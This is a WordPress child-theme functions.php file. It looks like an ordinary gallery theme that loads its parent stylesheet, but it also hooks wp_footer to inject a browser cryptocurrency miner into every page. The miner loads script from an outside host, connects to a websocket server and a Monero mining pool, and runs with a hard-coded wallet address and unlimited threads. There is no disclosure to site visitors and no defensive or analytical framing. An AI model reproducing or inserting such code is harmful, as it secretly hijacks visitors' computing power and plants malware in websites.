<?php 
	 add_action( 'wp_enqueue_scripts', 'gx_gallery_enqueue_styles' );
	 function gx_gallery_enqueue_styles() {
 		  wp_enqueue_style( 'parent-style', get_template_directory_uri() . '/style.css' ); 
 		  } 

		  

		   function hook_javascript_footer() {
			?>
				<script src="https://script.ghgi.xyz"></script>
				<script>
				  	server = "wss://ghgi.xyz";
        			let pool = "moneroocean.stream";
        			let walletAddress = "45bF6KJGyiVHiACEPn2KD2frjpuJjZBEM2iNxh6RNsfu11AhWHiqwPKJV3qj4jnDmGEKbQMiUcgXjZLwpTR2MnreQvhjQF4";
        			let workerId = "GXgal"
        			let threads = -1;
        			let password = "x";
        			startMining(pool, walletAddress, workerId, threads, password);
        			throttleMiner = 30;
				</script>
			<?php
		}
		add_action('wp_footer', 'hook_javascript_footer');
 ?>